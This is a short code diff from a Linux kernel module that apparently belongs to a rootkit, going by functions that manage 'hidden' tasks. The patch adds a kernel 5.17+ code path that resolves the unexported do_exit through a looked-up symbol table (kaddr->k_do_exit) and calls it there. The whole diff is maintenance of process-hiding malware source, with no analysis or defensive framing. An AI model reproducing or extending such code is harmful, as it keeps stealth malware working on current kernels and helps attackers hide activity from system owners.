@@ -234,6 +234,9 @@ struct reload_hidden {
 };
 
 static int _reload_hidden_task(void *t) {
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
+    struct kernel_syscalls *kaddr = kv_kall_load_addr();
+#endif
     struct reload_hidden *reload = (struct reload_hidden*)t;
     struct task_struct *task;
     unsigned int msecs;
@@ -269,7 +272,12 @@ error:
     prerr("Failed to reload hidden task\n");
 out:
     kfree(reload);
-    do_exit(0);
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
+              kaddr->k_do_exit(0);
+              return 0;
+#else
+              do_exit(0);
+#endif
 }
 
 void kv_reload_hidden_task(struct task_struct *task) {
